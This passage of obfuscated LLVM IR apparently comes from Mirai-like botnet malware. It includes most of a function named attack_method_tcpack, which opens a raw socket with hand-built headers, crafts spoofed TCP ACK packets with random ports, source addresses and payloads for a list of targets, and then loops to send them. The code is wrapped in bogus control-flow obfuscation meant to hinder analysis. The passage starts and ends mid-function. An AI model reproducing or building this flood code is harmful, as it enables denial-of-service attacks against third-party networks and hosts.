  %648 = bitcast %struct.iphdr* %647 to i8*
  %649 = load i8, i8* %648, align 4
  %_ = sub i8 0, %649
  %gen = add i8 %_, 15
  %_2 = sub i8 0, %649
  %gen3 = add i8 %_2, 15
  %_4 = sub i8 %649, 15
  %gen5 = mul i8 %_4, 15
  %650 = and i8 %649, 15
  %_6 = sub i8 0, %650
  %gen7 = add i8 %_6, 64
  %_8 = sub i8 %650, 64
  %gen9 = mul i8 %_8, 64
  %_10 = sub i8 %650, 64
  %gen11 = mul i8 %_10, 64
  %_12 = sub i8 %650, 64
  %gen13 = mul i8 %_12, 64
  %651 = or i8 %650, 64
  store i8 %651, i8* %648, align 4
  %652 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %653 = bitcast %struct.iphdr* %652 to i8*
  %654 = load i8, i8* %653, align 4
  %_14 = sub i8 %654, -16
  %gen15 = mul i8 %_14, -16
  %655 = and i8 %654, -16
  %_16 = sub i8 %655, 5
  %gen17 = mul i8 %_16, 5
  %_18 = sub i8 %655, 5
  %gen19 = mul i8 %_18, 5
  %_20 = sub i8 %655, 5
  %gen21 = mul i8 %_20, 5
  %_22 = shl i8 %655, 5
  %_23 = shl i8 %655, 5
  %_24 = sub i8 0, %655
  %gen25 = add i8 %_24, 5
  %_26 = sub i8 0, %655
  %gen27 = add i8 %_26, 5
  %_28 = sub i8 0, %655
  %gen29 = add i8 %_28, 5
  %_30 = sub i8 0, %655
  %gen31 = add i8 %_30, 5
  %656 = or i8 %655, 5
  store i8 %656, i8* %653, align 4
  %657 = load i8, i8* %12, align 1
  %658 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %659 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %658, i32 0, i32 1
  store i8 %657, i8* %659, align 1
  %660 = call zeroext i16 @htons(i16 zeroext 60) #7
  %661 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %662 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %661, i32 0, i32 2
  store i16 %660, i16* %662, align 2
  %663 = load i16, i16* %13, align 2
  %664 = call zeroext i16 @htons(i16 zeroext %663) #7
  %665 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %666 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %665, i32 0, i32 3
  store i16 %664, i16* %666, align 4
  %667 = load i8, i8* %14, align 1
  %668 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %669 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %668, i32 0, i32 5
  store i8 %667, i8* %669, align 4
  %670 = load i8, i8* %15, align 1
  %671 = icmp ne i8 %670, 0
  br label %originalBB1

originalBB35alteredBB:                            ; preds = %originalBB35, %317
  %672 = load i32, i32* %9, align 4
  %_36 = sub i32 0, %672
  %gen37 = add i32 %_36, 1
  %_38 = sub i32 %672, 1
  %gen39 = mul i32 %_38, 1
  %_40 = sub i32 0, %672
  %gen41 = add i32 %_40, 1
  %_42 = shl i32 %672, 1
  %673 = add nsw i32 %672, 1
  store i32 %673, i32* %9, align 4
  br label %originalBB35

originalBB46alteredBB:                            ; preds = %originalBB46, %337
  store i32 0, i32* %9, align 4
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %354
  %674 = load i32, i32* %9, align 4
  %675 = load i8, i8* %5, align 1
  %676 = zext i8 %675 to i32
  %677 = icmp slt i32 %674, %676
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %422
  %678 = load i16, i16* %13, align 2
  %679 = zext i16 %678 to i32
  %680 = icmp eq i32 %679, 65535
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %442
  %681 = call i32 @rand_next()
  %_59 = shl i32 %681, 65535
  %_60 = shl i32 %681, 65535
  %_61 = sub i32 0, %681
  %gen62 = add i32 %_61, 65535
  %_63 = shl i32 %681, 65535
  %682 = and i32 %681, 65535
  %683 = trunc i32 %682 to i16
  %684 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %685 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %684, i32 0, i32 3
  store i16 %683, i16* %685, align 4
  br label %originalBB58

originalBB67alteredBB:                            ; preds = %originalBB67, %464
  %686 = load i16, i16* %16, align 2
  %687 = zext i16 %686 to i32
  %688 = icmp eq i32 %687, 65535
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %490
  %689 = load i16, i16* %17, align 2
  %690 = zext i16 %689 to i32
  %691 = icmp eq i32 %690, 65535
  br label %originalBB71

originalBB75alteredBB:                            ; preds = %originalBB75, %510
  %692 = call i32 @rand_next()
  %_76 = sub i32 0, %692
  %gen77 = add i32 %_76, 65535
  %_78 = sub i32 0, %692
  %gen79 = add i32 %_78, 65535
  %_80 = sub i32 %692, 65535
  %gen81 = mul i32 %_80, 65535
  %_82 = shl i32 %692, 65535
  %_83 = shl i32 %692, 65535
  %_84 = sub i32 %692, 65535
  %gen85 = mul i32 %_84, 65535
  %_86 = sub i32 %692, 65535
  %gen87 = mul i32 %_86, 65535
  %693 = and i32 %692, 65535
  %694 = trunc i32 %693 to i16
  %695 = load %struct.tcphdr*, %struct.tcphdr** %32, align 8
  %696 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %695, i32 0, i32 1
  store i16 %694, i16* %696, align 2
  br label %originalBB75

originalBB91alteredBB:                            ; preds = %originalBB91, %539
  %697 = load i32, i32* %19, align 4
  %698 = icmp eq i32 %697, 65535
  br label %originalBB91

originalBB95alteredBB:                            ; preds = %originalBB95, %613
  br label %originalBB95
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = load i32, i32* @x.27
  %6 = load i32, i32* @y.28
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i8, align 1
  %14 = alloca %struct.attack_target*, align 8
  %15 = alloca i8, align 1
  %16 = alloca %struct.attack_option*, align 8
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i8**, align 8
  %20 = alloca i8, align 1
  %21 = alloca i16, align 2
  %22 = alloca i8, align 1
  %23 = alloca i8, align 1
  %24 = alloca i16, align 2
  %25 = alloca i16, align 2
  %26 = alloca i32, align 4
  %27 = alloca i32, align 4
  %28 = alloca i8, align 1
  %29 = alloca i8, align 1
  %30 = alloca i8, align 1
  %31 = alloca i8, align 1
  %32 = alloca i8, align 1
  %33 = alloca i8, align 1
  %34 = alloca i32, align 4
  %35 = alloca i8, align 1
  %36 = alloca i32, align 4
  %37 = alloca %struct.iphdr*, align 8
  %38 = alloca %struct.tcphdr*, align 8
  %39 = alloca i8*, align 8
  %40 = alloca i8*, align 8
  %41 = alloca %struct.iphdr*, align 8
  %42 = alloca %struct.tcphdr*, align 8
  %43 = alloca i8*, align 8
  %44 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %13, align 1
  store %struct.attack_target* %1, %struct.attack_target** %14, align 8
  store i8 %2, i8* %15, align 1
  store %struct.attack_option* %3, %struct.attack_option** %16, align 8
  %45 = load i8, i8* %13, align 1
  %46 = zext i8 %45 to i64
  %47 = call noalias i8* @calloc(i64 %46, i64 8) #6
  %48 = bitcast i8* %47 to i8**
  store i8** %48, i8*** %19, align 8
  %49 = load i8, i8* %15, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 2, i32 0)
  %52 = trunc i32 %51 to i8
  store i8 %52, i8* %20, align 1
  %53 = load i8, i8* %15, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 3, i32 65535)
  %56 = trunc i32 %55 to i16
  store i16 %56, i16* %21, align 2
  %57 = load i8, i8* %15, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 4, i32 64)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %22, align 1
  %61 = load i8, i8* %15, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 5, i32 0)
  %64 = trunc i32 %63 to i8
  store i8 %64, i8* %23, align 1
  %65 = load i8, i8* %15, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 6, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %24, align 2
  %69 = load i8, i8* %15, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 7, i32 65535)
  %72 = trunc i32 %71 to i16
  store i16 %72, i16* %25, align 2
  %73 = load i8, i8* %15, align 1
  %74 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %75 = call i32 @attack_get_opt_int(i8 zeroext %73, %struct.attack_option* %74, i8 zeroext 17, i32 65535)
  store i32 %75, i32* %26, align 4
  %76 = load i8, i8* %15, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 18, i32 65535)
  store i32 %78, i32* %27, align 4
  %79 = load i8, i8* %15, align 1
  %80 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %81 = call i32 @attack_get_opt_int(i8 zeroext %79, %struct.attack_option* %80, i8 zeroext 11, i32 0)
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %28, align 1
  %83 = load i8, i8* %15, align 1
  %84 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %85 = call i32 @attack_get_opt_int(i8 zeroext %83, %struct.attack_option* %84, i8 zeroext 12, i32 1)
  %86 = trunc i32 %85 to i8
  store i8 %86, i8* %29, align 1
  %87 = load i8, i8* %15, align 1
  %88 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %89 = call i32 @attack_get_opt_int(i8 zeroext %87, %struct.attack_option* %88, i8 zeroext 13, i32 0)
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %30, align 1
  %91 = load i8, i8* %15, align 1
  %92 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %93 = call i32 @attack_get_opt_int(i8 zeroext %91, %struct.attack_option* %92, i8 zeroext 14, i32 0)
  %94 = trunc i32 %93 to i8
  store i8 %94, i8* %31, align 1
  %95 = load i8, i8* %15, align 1
  %96 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %97 = call i32 @attack_get_opt_int(i8 zeroext %95, %struct.attack_option* %96, i8 zeroext 15, i32 0)
  %98 = trunc i32 %97 to i8
  store i8 %98, i8* %32, align 1
  %99 = load i8, i8* %15, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 16, i32 0)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %33, align 1
  %103 = load i8, i8* %15, align 1
  %104 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %105 = call i32 @attack_get_opt_int(i8 zeroext %103, %struct.attack_option* %104, i8 zeroext 0, i32 512)
  store i32 %105, i32* %34, align 4
  %106 = load i8, i8* %15, align 1
  %107 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %108 = call i32 @attack_get_opt_int(i8 zeroext %106, %struct.attack_option* %107, i8 zeroext 1, i32 1)
  %109 = trunc i32 %108 to i8
  store i8 %109, i8* %35, align 1
  %110 = load i8, i8* %15, align 1
  %111 = load %struct.attack_option*, %struct.attack_option** %16, align 8
  %112 = load i32, i32* @LOCAL_ADDR, align 4
  %113 = call i32 @attack_get_opt_ip(i8 zeroext %110, %struct.attack_option* %111, i8 zeroext 25, i32 %112)
  store i32 %113, i32* %36, align 4
  %114 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %114, i32* %18, align 4
  %115 = icmp eq i32 %114, -1
  %116 = load i32, i32* @x.27
  %117 = load i32, i32* @y.28
  %118 = sub i32 %116, 1
  %119 = mul i32 %116, %118
  %120 = urem i32 %119, 2
  %121 = icmp eq i32 %120, 0
  %122 = icmp slt i32 %117, 10
  %123 = or i1 %121, %122
  br i1 %123, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %115, label %124, label %125

; <label>:124:                                    ; preds = %originalBBpart2
  br label %664

; <label>:125:                                    ; preds = %originalBBpart2
  store i32 1, i32* %17, align 4
  %126 = load i32, i32* %18, align 4
  %127 = bitcast i32* %17 to i8*
  %128 = call i32 @setsockopt(i32 %126, i32 0, i32 3, i8* %127, i32 4) #6
  %129 = icmp eq i32 %128, -1
  br i1 %129, label %130, label %133

; <label>:130:                                    ; preds = %125
  %131 = load i32, i32* %18, align 4
  %132 = call i32 @close(i32 %131)
  br label %664

; <label>:133:                                    ; preds = %125
  store i32 0, i32* %17, align 4
  br label %134

; <label>:134:                                    ; preds = %325, %133
  %135 = load i32, i32* @x.27
  %136 = load i32, i32* @y.28
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %134
  %143 = load i32, i32* %17, align 4
  %144 = load i8, i8* %13, align 1
  %145 = zext i8 %144 to i32
  %146 = icmp slt i32 %143, %145
  %147 = load i32, i32* @x.27
  %148 = load i32, i32* @y.28
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %146, label %155, label %328

; <label>:155:                                    ; preds = %originalBBpart24
  %156 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %157 = load i8**, i8*** %19, align 8
  %158 = load i32, i32* %17, align 4
  %159 = sext i32 %158 to i64
  %160 = getelementptr inbounds i8*, i8** %157, i64 %159
  store i8* %156, i8** %160, align 8
  %161 = load i8**, i8*** %19, align 8
  %162 = load i32, i32* %17, align 4
  %163 = sext i32 %162 to i64
  %164 = getelementptr inbounds i8*, i8** %161, i64 %163
  %165 = load i8*, i8** %164, align 8
  %166 = bitcast i8* %165 to %struct.iphdr*
  store %struct.iphdr* %166, %struct.iphdr** %37, align 8
  %167 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %168 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %167, i64 1
  %169 = bitcast %struct.iphdr* %168 to %struct.tcphdr*
  store %struct.tcphdr* %169, %struct.tcphdr** %38, align 8
  %170 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %171 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %170, i64 1
  %172 = bitcast %struct.tcphdr* %171 to i8*
  store i8* %172, i8** %39, align 8
  %173 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %174 = bitcast %struct.iphdr* %173 to i8*
  %175 = load i8, i8* %174, align 4
  %176 = and i8 %175, 15
  %177 = or i8 %176, 64
  store i8 %177, i8* %174, align 4
  %178 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %179 = bitcast %struct.iphdr* %178 to i8*
  %180 = load i8, i8* %179, align 4
  %181 = and i8 %180, -16
  %182 = or i8 %181, 5
  store i8 %182, i8* %179, align 4
  %183 = load i8, i8* %20, align 1
  %184 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %185 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %184, i32 0, i32 1
  store i8 %183, i8* %185, align 1
  %186 = load i32, i32* %34, align 4
  %187 = sext i32 %186 to i64
  %188 = add i64 40, %187
  %189 = trunc i64 %188 to i16
  %190 = call zeroext i16 @htons(i16 zeroext %189) #7
  %191 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %192 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %191, i32 0, i32 2
  store i16 %190, i16* %192, align 2
  %193 = load i16, i16* %21, align 2
  %194 = call zeroext i16 @htons(i16 zeroext %193) #7
  %195 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %196 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %195, i32 0, i32 3
  store i16 %194, i16* %196, align 4
  %197 = load i8, i8* %22, align 1
  %198 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %199 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %198, i32 0, i32 5
  store i8 %197, i8* %199, align 4
  %200 = load i8, i8* %23, align 1
  %201 = icmp ne i8 %200, 0
  br i1 %201, label %202, label %206

; <label>:202:                                    ; preds = %155
  %203 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %204 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %205 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %204, i32 0, i32 4
  store i16 %203, i16* %205, align 2
  br label %206

; <label>:206:                                    ; preds = %202, %155
  %207 = load i32, i32* @x.27
  %208 = load i32, i32* @y.28
  %209 = sub i32 %207, 1
  %210 = mul i32 %207, %209
  %211 = urem i32 %210, 2
  %212 = icmp eq i32 %211, 0
  %213 = icmp slt i32 %208, 10
  %214 = or i1 %212, %213
  br i1 %214, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %206
  %215 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 6
  store i8 6, i8* %216, align 1
  %217 = load i32, i32* %36, align 4
  %218 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %219 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %218, i32 0, i32 8
  store i32 %217, i32* %219, align 4
  %220 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %221 = load i32, i32* %17, align 4
  %222 = sext i32 %221 to i64
  %223 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i64 %222
  %224 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %223, i32 0, i32 1
  %225 = load i32, i32* %224, align 4
  %226 = load %struct.iphdr*, %struct.iphdr** %37, align 8
  %227 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %226, i32 0, i32 9
  store i32 %225, i32* %227, align 4
  %228 = load i16, i16* %24, align 2
  %229 = call zeroext i16 @htons(i16 zeroext %228) #7
  %230 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %231 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %230, i32 0, i32 0
  store i16 %229, i16* %231, align 4
  %232 = load i16, i16* %25, align 2
  %233 = call zeroext i16 @htons(i16 zeroext %232) #7
  %234 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %235 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %234, i32 0, i32 1
  store i16 %233, i16* %235, align 2
  %236 = load i32, i32* %26, align 4
  %237 = trunc i32 %236 to i16
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = zext i16 %238 to i32
  %240 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %241 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %240, i32 0, i32 2
  store i32 %239, i32* %241, align 4
  %242 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %243 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %242, i32 0, i32 4
  %244 = load i16, i16* %243, align 4
  %245 = and i16 %244, -241
  %246 = or i16 %245, 80
  store i16 %246, i16* %243, align 4
  %247 = load i8, i8* %28, align 1
  %248 = sext i8 %247 to i16
  %249 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %250 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %249, i32 0, i32 4
  %251 = load i16, i16* %250, align 4
  %252 = and i16 %248, 1
  %253 = shl i16 %252, 13
  %254 = and i16 %251, -8193
  %255 = or i16 %254, %253
  store i16 %255, i16* %250, align 4
  %256 = load i8, i8* %29, align 1
  %257 = sext i8 %256 to i16
  %258 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %259 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %258, i32 0, i32 4
  %260 = load i16, i16* %259, align 4
  %261 = and i16 %257, 1
  %262 = shl i16 %261, 12
  %263 = and i16 %260, -4097
  %264 = or i16 %263, %262
  store i16 %264, i16* %259, align 4
  %265 = load i8, i8* %30, align 1
  %266 = sext i8 %265 to i16
  %267 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %268 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %267, i32 0, i32 4
  %269 = load i16, i16* %268, align 4
  %270 = and i16 %266, 1
  %271 = shl i16 %270, 11
  %272 = and i16 %269, -2049
  %273 = or i16 %272, %271
  store i16 %273, i16* %268, align 4
  %274 = load i8, i8* %31, align 1
  %275 = sext i8 %274 to i16
  %276 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %277 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %276, i32 0, i32 4
  %278 = load i16, i16* %277, align 4
  %279 = and i16 %275, 1
  %280 = shl i16 %279, 10
  %281 = and i16 %278, -1025
  %282 = or i16 %281, %280
  store i16 %282, i16* %277, align 4
  %283 = load i8, i8* %32, align 1
  %284 = sext i8 %283 to i16
  %285 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %286 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %285, i32 0, i32 4
  %287 = load i16, i16* %286, align 4
  %288 = and i16 %284, 1
  %289 = shl i16 %288, 9
  %290 = and i16 %287, -513
  %291 = or i16 %290, %289
  store i16 %291, i16* %286, align 4
  %292 = load i8, i8* %33, align 1
  %293 = sext i8 %292 to i16
  %294 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %295 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %294, i32 0, i32 4
  %296 = load i16, i16* %295, align 4
  %297 = and i16 %293, 1
  %298 = shl i16 %297, 8
  %299 = and i16 %296, -257
  %300 = or i16 %299, %298
  store i16 %300, i16* %295, align 4
  %301 = call i32 @rand_next()
  %302 = and i32 %301, 65535
  %303 = trunc i32 %302 to i16
  %304 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %305 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %304, i32 0, i32 5
  store i16 %303, i16* %305, align 2
  %306 = load i8, i8* %30, align 1
  %307 = icmp ne i8 %306, 0
  %308 = load i32, i32* @x.27
  %309 = load i32, i32* @y.28
  %310 = sub i32 %308, 1
  %311 = mul i32 %308, %310
  %312 = urem i32 %311, 2
  %313 = icmp eq i32 %312, 0
  %314 = icmp slt i32 %309, 10
  %315 = or i1 %313, %314
  br i1 %315, label %originalBBpart2188, label %originalBB6alteredBB

originalBBpart2188:                               ; preds = %originalBB6
  br i1 %307, label %316, label %322

; <label>:316:                                    ; preds = %originalBBpart2188
  %317 = load %struct.tcphdr*, %struct.tcphdr** %38, align 8
  %318 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %317, i32 0, i32 4
  %319 = load i16, i16* %318, align 4
  %320 = and i16 %319, -2049
  %321 = or i16 %320, 2048
  store i16 %321, i16* %318, align 4
  br label %322

; <label>:322:                                    ; preds = %316, %originalBBpart2188
  %323 = load i8*, i8** %39, align 8
  %324 = load i32, i32* %34, align 4
  call void @rand_str(i8* %323, i32 %324)
  br label %325

; <label>:325:                                    ; preds = %322
  %326 = load i32, i32* %17, align 4
  %327 = add nsw i32 %326, 1
  store i32 %327, i32* %17, align 4
  br label %134

; <label>:328:                                    ; preds = %originalBBpart24
  br label %329

; <label>:329:                                    ; preds = %663, %328
  %330 = load i32, i32* @x.27
  %331 = load i32, i32* @y.28
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB190, label %originalBB190alteredBB

originalBB190:                                    ; preds = %originalBB190alteredBB, %329
  store i32 0, i32* %17, align 4
  %338 = load i32, i32* @x.27
  %339 = load i32, i32* @y.28
  %340 = sub i32 %338, 1
  %341 = mul i32 %338, %340
  %342 = urem i32 %341, 2
  %343 = icmp eq i32 %342, 0
  %344 = icmp slt i32 %339, 10
  %345 = or i1 %343, %344
  br i1 %345, label %originalBBpart2192, label %originalBB190alteredBB

originalBBpart2192:                               ; preds = %originalBB190
  br label %346

; <label>:346:                                    ; preds = %660, %originalBBpart2192
  %347 = load i32, i32* %17, align 4
  %348 = load i8, i8* %13, align 1
  %349 = zext i8 %348 to i32
  %350 = icmp slt i32 %347, %349
  br i1 %350, label %351, label %663

; <label>:351:                                    ; preds = %346
  %352 = load i32, i32* @x.27
  %353 = load i32, i32* @y.28
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB194, label %originalBB194alteredBB

originalBB194:                                    ; preds = %originalBB194alteredBB, %351
  %360 = load i8**, i8*** %19, align 8
  %361 = load i32, i32* %17, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds i8*, i8** %360, i64 %362
  %364 = load i8*, i8** %363, align 8
  store i8* %364, i8** %40, align 8
  %365 = load i8*, i8** %40, align 8
  %366 = bitcast i8* %365 to %struct.iphdr*
  store %struct.iphdr* %366, %struct.iphdr** %41, align 8
  %367 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %368 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %367, i64 1
  %369 = bitcast %struct.iphdr* %368 to %struct.tcphdr*
  store %struct.tcphdr* %369, %struct.tcphdr** %42, align 8
  %370 = load %struct.tcphdr*, %struct.tcphdr** %42, align 8
  %371 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %370, i64 1
  %372 = bitcast %struct.tcphdr* %371 to i8*
  store i8* %372, i8** %43, align 8
  %373 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %374 = load i32, i32* %17, align 4
  %375 = sext i32 %374 to i64
  %376 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %373, i64 %375
  %377 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %376, i32 0, i32 2
  %378 = load i8, i8* %377, align 4
  %379 = zext i8 %378 to i32
  %380 = icmp slt i32 %379, 32
  %381 = load i32, i32* @x.27
  %382 = load i32, i32* @y.28
  %383 = sub i32 %381, 1
  %384 = mul i32 %381, %383
  %385 = urem i32 %384, 2
  %386 = icmp eq i32 %385, 0
  %387 = icmp slt i32 %382, 10
  %388 = or i1 %386, %387
  br i1 %388, label %originalBBpart2196, label %originalBB194alteredBB

originalBBpart2196:                               ; preds = %originalBB194
  br i1 %380, label %389, label %410

; <label>:389:                                    ; preds = %originalBBpart2196
  %390 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %391 = load i32, i32* %17, align 4
  %392 = sext i32 %391 to i64
  %393 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %390, i64 %392
  %394 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %393, i32 0, i32 1
  %395 = load i32, i32* %394, align 4
  %396 = call i32 @ntohl(i32 %395) #7
  %397 = call i32 @rand_next()
  %398 = load %struct.attack_target*, %struct.attack_target** %14, align 8
  %399 = load i32, i32* %17, align 4
  %400 = sext i32 %399 to i64
  %401 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %398, i64 %400
  %402 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %401, i32 0, i32 2
  %403 = load i8, i8* %402, align 4
  %404 = zext i8 %403 to i32
  %405 = lshr i32 %397, %404
  %406 = add i32 %396, %405
  %407 = call i32 @htonl(i32 %406) #7
  %408 = load %struct.iphdr*, %struct.iphdr** %41, align 8
  %409 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %408, i32 0, i32 9
  store i32 %407, i32* %409, align 4
  br label %410

; <label>:410:                                    ; preds = %389, %originalBBpart2196
  %411 = load i32, i32* @x.27
  %412 = load i32, i32* @y.28
  %413 = sub i32 %411, 1
  %414 = mul i32 %411, %413
  %415 = urem i32 %414, 2
  %416 = icmp eq i32 %415, 0
  %417 = icmp slt i32 %412, 10
  %418 = or i1 %416, %417
  br i1 %418, label %originalBB198, label %originalBB198alteredBB

originalBB198:                                    ; preds = %originalBB198alteredBB, %410
  %419 = load i32, i32* %36, align 4
  %420 = icmp eq i32 %419, -1
  %421 = load i32, i32* @x.27
  %422 = load i32, i32* @y.28
  %423 = sub i32 %421, 1
  %424 = mul i32 %421, %423
  %425 = urem i32 %424, 2
  %426 = icmp eq i32 %425, 0
  %427 = icmp slt i32 %422, 10
  %428 = or i1 %426, %427
  br i1 %428, label %originalBBpart2200, label %originalBB198alteredBB

originalBBpart2200:                               ; preds = %originalBB198
  br i1 %420, label %429, label %449

; <label>:429:                                    ; preds = %originalBBpart2200
  %430 = load i32, i32* @x.27
